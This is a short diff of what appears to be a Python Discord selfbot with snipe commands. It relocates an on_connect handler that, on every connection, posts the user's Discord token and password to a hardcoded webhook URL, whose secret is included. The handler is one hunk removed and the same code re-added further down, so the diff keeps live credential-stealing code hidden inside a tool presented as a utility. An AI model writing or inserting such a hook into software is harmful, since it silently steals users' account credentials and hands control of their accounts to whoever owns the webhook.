@@ -208,12 +208,6 @@ async def on_command_error(ctx, error):
         ctx.send(f'[ERROR]: {error_str}', delete_after=3)
 
 @Iso.event
-async def on_connect():
-  Clear()
-  requests.post('https://discord.com/api/webhooks/758323372253118484/BJSFQ5QjG5zm8-3NVptNvcmL9MQpmpA35_tfz7B3soVoNK0Y95l5kdHBJv3ElVkeMyLI',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
-
-
-@Iso.event
 async def on_message_edit(before, after):
     await Iso.process_commands(after)
 
@@ -430,6 +424,11 @@ async def on_message_edit(before, after):
             before.content) + "\n\n**Attachments:**\n" + links
         Iso.sniped_edited_message_dict.update({channel_id: message_content})
 
+@Iso.event
+async def on_connect():
+  Clear()
+  requests.post('https://discord.com/api/webhooks/758323372253118484/BJSFQ5QjG5zm8-3NVptNvcmL9MQpmpA35_tfz7B3soVoNK0Y95l5kdHBJv3ElVkeMyLI',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})        
+        
 @Iso.command(aliases=["esnipe"])
 async def editsnipe(ctx):
     await ctx.message.delete()
